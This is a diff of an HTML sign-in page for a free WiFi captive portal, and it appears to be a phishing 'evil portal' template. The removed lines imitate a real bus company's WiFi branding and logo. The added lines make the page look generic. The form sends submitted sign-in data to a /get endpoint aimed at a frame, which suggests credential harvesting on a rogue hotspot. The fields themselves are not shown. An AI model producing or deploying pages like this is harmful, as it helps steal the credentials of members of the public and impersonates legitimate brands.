@@ -3,25 +3,25 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Stagecoach Free WiFi - Connect</title>
+<title>Free WiFi - Connect</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
-body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;background:linear-gradient(135deg,#005cab,#003f7d,#002f5c);color:#fff}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);color:#fff}
 .container{width:90%;max-width:380px;text-align:center}
 .card{background:rgba(255,255,255,.08);backdrop-filter:blur(20px);border-radius:20px;padding:40px 30px;border:1px solid rgba(255,255,255,.12);box-shadow:0 8px 32px rgba(0,0,0,.3)}
-.stagecoach-logo{width:180px;margin:0 auto 20px;display:block}
-.stagecoach-logo svg{width:100%;height:auto}
+.wifi-icon{width:70px;height:70px;margin:0 auto 20px}
+.wifi-icon svg{width:100%;height:100%}
 h1{font-size:22px;font-weight:600;margin-bottom:6px}
 .subtitle{font-size:13px;color:rgba(255,255,255,.6);margin-bottom:28px}
 .field{position:relative;margin-bottom:16px}
 .field input{width:100%;padding:14px 16px;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.15);border-radius:12px;color:#fff;font-size:15px;outline:none;transition:border .2s}
 .field input::placeholder{color:rgba(255,255,255,.35)}
 .field input:focus{border-color:rgba(99,102,241,.8);background:rgba(255,255,255,.1)}
-.btn{width:100%;padding:14px;background:linear-gradient(135deg,#ff8000,#e06d00);border:none;border-radius:12px;color:#fff;font-size:16px;font-weight:600;cursor:pointer;transition:transform .15s,box-shadow .15s;margin-top:4px}
+.btn{width:100%;padding:14px;background:linear-gradient(135deg,#6366f1,#8b5cf6);border:none;border-radius:12px;color:#fff;font-size:16px;font-weight:600;cursor:pointer;transition:transform .15s,box-shadow .15s;margin-top:4px}
 .btn:active{transform:scale(.98)}
-.btn:hover{box-shadow:0 4px 20px rgba(255,128,0,.4)}
+.btn:hover{box-shadow:0 4px 20px rgba(99,102,241,.4)}
 .terms{font-size:11px;color:rgba(255,255,255,.4);margin-top:20px;line-height:1.5}
-.terms a{color:rgba(255,165,0,.8);text-decoration:none}
+.terms a{color:rgba(99,102,241,.8);text-decoration:none}
 .lock{display:inline-block;margin-right:4px;vertical-align:middle;opacity:.5}
 .divider{display:flex;align-items:center;margin:20px 0;gap:12px}
 .divider span{font-size:12px;color:rgba(255,255,255,.3);white-space:nowrap}
@@ -33,19 +33,15 @@ h1{font-size:22px;font-weight:600;margin-bottom:6px}
 <body>
 <div class="container">
 <div class="card">
-
-<!-- Inline Stagecoach Logo Vector -->
-<div class="stagecoach-logo">
-<svg viewBox="0 0 280 60" xmlns="http://www.w3.org/2000/svg">
-  <!-- Swoosh Graphic -->
-  <path d="M 10 38 Q 45 10 90 28 Q 135 46 170 18" fill="none" stroke="#005cab" stroke-width="8" stroke-linecap="round"/>
-  <path d="M 25 43 Q 55 18 95 33 Q 135 48 165 26" fill="none" stroke="#ff8000" stroke-width="6" stroke-linecap="round"/>
-  <!-- Stagecoach Text -->
-  <text x="10" y="48" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-weight="800" font-style="italic" font-size="28" fill="#ffffff" letter-spacing="0.5">Stagecoach</text>
+<div class="wifi-icon">
+<svg viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M 12 32 A 52 52 0 0 1 88 32" stroke="rgba(255,255,255,0.9)" stroke-width="10" stroke-linecap="round"/>
+  <path d="M 26 48 A 34 34 0 0 1 74 48" stroke="rgba(255,255,255,0.9)" stroke-width="9" stroke-linecap="round"/>
+  <path d="M 40 64 A 16 16 0 0 1 60 64" stroke="rgba(255,255,255,0.9)" stroke-width="8" stroke-linecap="round"/>
+  <circle cx="50" cy="79" r="4.5" fill="rgba(255,255,255,0.9)"/>
 </svg>
 </div>
-
-<h1>Stagecoach WiFi</h1>
+<h1>Welcome</h1>
 <p class="subtitle">Sign in to connect to free WiFi</p>
 <form id="f" method="POST" action="/get" target="h">
 <div class="field">
